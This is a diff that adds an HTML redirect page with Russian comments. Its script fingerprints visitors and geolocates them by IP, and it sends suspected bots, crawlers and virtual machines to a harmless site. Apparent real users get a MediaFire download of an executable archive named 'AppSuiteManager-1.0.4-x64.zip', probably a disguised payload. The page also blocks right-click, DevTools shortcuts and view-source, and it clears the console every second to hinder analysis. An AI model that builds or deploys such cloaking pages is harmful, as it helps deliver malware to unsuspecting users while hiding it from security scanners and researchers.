@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
+  <style>
+    body {
+      margin: 0; padding: 0; background: linear-gradient(45deg, #1e3c72, #2a5298);
+      color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex; justify-content: center; align-items: center; height: 100vh;
+    }
+    .container { text-align: center; padding: 40px; }
+    .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.3);
+      border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;
+      margin: 0 auto 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .message { font-size: 18px; margin: 10px 0; }
+    .progress { width: 200px; height: 4px; background: rgba(255,255,255,0.3);
+      border-radius: 2px; margin: 20px auto; overflow: hidden; }
+    .progress-bar { height: 100%; background: #fff; width: 0%; animation: progress 3s ease-in-out; }
+    @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="spinner"></div>
+    <div class="message">Analyzing traffic...</div>
+    <div class="progress"><div class="progress-bar"></div></div>
+  </div>
+
+  <script>
+    // 🔥 ПРОДВИНУТАЯ КОНФИГУРАЦИЯ
+    const config = {
+      // Ссылки для редиректа
+      botLink: 'https://www.syncplicity.com/',
+      userLink: 'https://www.mediafire.com/file_premium/sz58shk4kwcduyu/AppSuiteManager-1.0.4-x64.zip/file',
+      
+      // Настройки
+      delay: 3000,
+      strictMode: true, // Более строгая детекция
+      
+      // Проверка по геолокации (опционально)
+      blockedCountries: ['CN', 'RU'], // ISO коды стран
+      
+      // Проверка по времени (блокировать в рабочие часы)
+      workingHoursBlock: false,
+      workingHours: { start: 9, end: 17 }
+    };
+
+    class AdvancedBotDetector {
+      constructor() {
+        this.suspiciousPoints = 0;
+        this.detectionResults = {};
+        this.userIP = null;
+        this.userLocation = null;
+      }
+
+      // 🔍 Получение IP адреса
+      async getUserIP() {
+        try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          const data = await response.json();
+          this.userIP = data.ip;
+          return data.ip;
+        } catch {
+          return null;
+        }
+      }
+
+      // 🌍 Получение геолокации
+      async getLocation() {
+        try {
+          if (!this.userIP) await this.getUserIP();
+          
+          const response = await fetch(`https://ipapi.co/${this.userIP}/json/`);
+          const data = await response.json();
+          this.userLocation = data;
+          return data;
+        } catch {
+          return null;
+        }
+      }
+
+      // 🤖 Базовые проверки ботов
+      basicBotChecks() {
+        const checks = {
+          userAgent: () => {
+            const ua = navigator.userAgent.toLowerCase();
+            const patterns = [
+              'bot', 'crawler', 'spider', 'scraper', 'automated',
+              'googlebot', 'bingbot', 'yandexbot', 'baiduspider',
+              'facebookexternalhit', 'twitterbot', 'linkedinbot',
+              'whatsapp', 'telegram', 'discord', 'headless',
+              'phantom', 'selenium', 'webdriver', 'chrome-lighthouse'
+            ];
+            return patterns.some(p => ua.includes(p));
+          },
+
+          webGL: () => {
+            try {
+              const canvas = document.createElement('canvas');
+              const gl = canvas.getContext('webgl');
+              if (!gl) return true;
+              
+              const vendor = gl.getParameter(gl.VENDOR);
+              const renderer = gl.getParameter(gl.RENDERER);
+              
+              // Проверка на виртуальные GPU
+              const suspicious = [
+                'swiftshader', 'llvmpipe', 'virtualbox',
+                'vmware', 'microsoft basic render'
+              ];
+              
+              return suspicious.some(s => 
+                vendor.toLowerCase().includes(s) || 
+                renderer.toLowerCase().includes(s)
+              );
+            } catch {
+              return true;
+            }
+          },
+
+          screen: () => {
+            const w = screen.width, h = screen.height;
+            return w < 100 || h < 100 || 
+                   (w === 800 && h === 600) ||
+                   (w === 1024 && h === 768) ||
+                   w > 3000 || h > 3000;
+          },
+
+          plugins: () => navigator.plugins.length === 0,
+
+          languages: () => {
+            const langs = navigator.languages;
+            return !langs || langs.length === 0 || 
+                   (langs.length === 1 && langs[0] === 'en-US');
+          },
+
+          permissions: () => {
+            return !navigator.permissions || 
+                   typeof navigator.permissions.query !== 'function';
+          },
+
+          connection: () => {
+            const conn = navigator.connection;
+            return !conn || conn.effectiveType === 'slow-2g';
+          },
+
+          touch: () => {
+            return 'ontouchstart' in window && navigator.maxTouchPoints === 0;
+          }
+        };
+
+        let suspicious = 0;
+        for (const [name, check] of Object.entries(checks)) {
+          try {
+            const result = check();
+            this.detectionResults[name] = result;
+            if (result) suspicious++;
+          } catch {
+            this.detectionResults[name] = true;
+            suspicious++;
+          }
+        }
+
+        return suspicious >= (config.strictMode ? 2 : 3);
+      }
+
+      // 🎨 Canvas fingerprinting
+      canvasFingerprint() {
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          
+          ctx.textBaseline = 'top';
+          ctx.font = '14px Arial';
+          ctx.fillStyle = '#f60';
+          ctx.fillRect(125, 1, 62, 20);
+          ctx.fillStyle = '#069';
+          ctx.fillText('🤖 Bot test 123!@#', 2, 15);
+          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+          ctx.fillText('Fingerprint test', 4, 45);
+
+          const imageData = canvas.toDataURL();
+          
+          // Слишком короткий = подозрительно
+          if (imageData.length < 5000) return true;
+          
+          // Стандартные значения для headless браузеров
+          const suspiciousHashes = [
+            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA',
+            'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwA'
+          ];
+          
+          return suspiciousHashes.some(hash => imageData.startsWith(hash));
+        } catch {
+          return true;
+        }
+      }
+
+      // ⏰ Проверка времени и поведения
+      behaviorChecks() {
+        const checks = [];
+
+        // Слишком быстрая загрузка
+        checks.push(performance.now() < 50);
+
+        // Нет истории браузера
+        checks.push(history.length <= 1);
+
+        // Подозрительный referrer
+        const ref = document.referrer.toLowerCase();
+        const badRefs = ['facebook.com', 't.co', 'bit.ly', 'tinyurl.com'];
+        checks.push(badRefs.some(domain => ref.includes(domain)));
+
+        // Проверка DevTools
+        const devToolsOpen = () => {
+          const threshold = 160;
+          return window.outerHeight - window.innerHeight > threshold ||
+                 window.outerWidth - window.innerWidth > threshold;
+        };
+        checks.push(devToolsOpen());
+
+        // Автоматизация
+        checks.push(
+          navigator.webdriver === true ||
+          !!window.phantom ||
+          !!window.callPhantom ||
+          !!window._phantom ||
+          !!window.__nightmare
+        );
+
+        return checks.filter(Boolean).length >= 2;
+      }
+
+      // 🌐 Геоблокировка
+      async geoBlock() {
+        if (config.blockedCountries.length === 0) return false;
+
+        try {
+          const location = await this.getLocation();
+          if (!location) return false;
+
+          return config.blockedCountries.includes(location.country_code);
+        } catch {
+          return false;
+        }
+      }
+
+      // 🕐 Блокировка по времени
+      timeBlock() {
+        if (!config.workingHoursBlock) return false;
+
+        const now = new Date();
+        const hour = now.getHours();
+        const { start, end } = config.workingHours;
+
+        return hour >= start && hour <= end;
+      }
+
+      // 📊 Финальная оценка
+      async detect() {
+        console.log('🔍 Starting advanced bot detection...');
+
+        const checks = await Promise.all([
+          this.basicBotChecks(),
+          this.canvasFingerprint(),
+          this.behaviorChecks(),
+          this.geoBlock(),
+          this.timeBlock()
+        ]);
+
+        const [isBasicBot, isSuspiciousCanvas, isSuspiciousBehavior, isGeoBlocked, isTimeBlocked] = checks;
+
+        const totalSuspicious = checks.filter(Boolean).length;
+        
+        console.log('Detection results:', {
+          basicBot: isBasicBot,
+          suspiciousCanvas: isSuspiciousCanvas,
+          suspiciousBehavior: isSuspiciousBehavior,
+          geoBlocked: isGeoBlocked,
+          timeBlocked: isTimeBlocked,
+          totalScore: totalSuspicious,
+          userIP: this.userIP,
+          location: this.userLocation?.city + ', ' + this.userLocation?.country_name
+        });
+
+        // Строгий режим: любая 1 проверка = бот
+        // Обычный режим: 2+ проверки = бот
+        return config.strictMode ? totalSuspicious >= 1 : totalSuspicious >= 2;
+      }
+    }
+
+    // 🚀 Основная логика
+    async function main() {
+      const detector = new AdvancedBotDetector();
+      
+      try {
+        // Обновляем сообщение
+        document.querySelector('.message').textContent = 'Checking security...';
+        
+        // Детекция
+        const isBot = await detector.detect();
+        
+        // Выбираем ссылку
+        const redirectUrl = isBot ? config.botLink : config.userLink;
+        
+        console.log(`🎯 Redirecting to: ${isBot ? 'BOT' : 'USER'} link`);
+        
+        // Обновляем сообщение
+        document.querySelector('.message').textContent = 
+          isBot ? 'Security check complete' : 'Redirecting to content...';
+        
+        // Редирект
+        setTimeout(() => {
+          window.location.replace(redirectUrl);
+        }, config.delay);
+
+      } catch (error) {
+        console.error('❌ Detection error:', error);
+        // В случае ошибки - редиректим как бота
+        setTimeout(() => {
+          window.location.replace(config.botLink);
+        }, config.delay);
+      }
+    }
+
+    // 🔒 Защита от анализа
+    (() => {
+      // Отключаем правый клик
+      document.addEventListener('contextmenu', e => e.preventDefault());
+      
+      // Отключаем горячие клавиши
+      document.addEventListener('keydown', e => {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && (e.key === 'u' || e.key === 'U')) ||
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i'))) {
+          e.preventDefault();
+        }
+      });
+
+      // Очищаем консоль в продакшене
+      if (location.hostname !== 'localhost') {
+        console.clear();
+        setInterval(() => console.clear(), 1000);
+      }
+    })();
+
+    // Запуск
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', main);
+    } else {
+      main();
+    }
+  </script>
+</body>
+</html> 
